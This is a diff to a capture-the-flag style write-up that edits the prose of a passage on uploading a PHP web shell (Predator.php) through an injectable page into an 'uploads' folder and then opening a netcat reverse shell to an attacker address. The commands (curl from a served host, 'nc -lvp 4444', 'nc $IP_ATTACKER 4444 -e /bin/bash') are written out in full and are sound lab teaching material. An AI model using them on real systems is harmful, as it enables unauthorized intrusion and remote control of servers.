@@ -128,7 +128,7 @@ drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
 drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
 ```
 
-It seems `uploads` may be a good place where to place a web shell. I'm going to use a shell called `Predator.php` I got from this repo https://github.com/JohnTroony/php-webshells.git:
+It seems `uploads` may be a good place where to place a web shell. I'm going to use a shell called `Predator.php` I got from this repo https://github.com/JohnTroony/php-webshells.git. The first step is to make the shell "curleable" by exposing it through an http server:
 ```
 cd php-webshells
 python -m SimpleHTTPServer
@@ -140,14 +140,14 @@ And now from the input in /exposed.php we curl it to uploads:
 10.10.14.23:8000/Predator.php -o uploads/Predator.php
 ```
 
-Now, going to `uploads/Predator.php` the webshell can be accessed.
+The shell is accessible from `uploads/Predator.php`, so let's set up a reverse shell using it.
 
 Set `nc` listener in the attacker to handle the reverse shell:
 ```
 nc -lvp 4444
 ```
 
-The webshell allows the user to execute in a shell. We hit the handler:
+The webshell allows the user to execute in a shell. Connect to the attacker as follows:
 ```
 nc $IP_ATTACKER 4444 -e /bin/bash
 ```
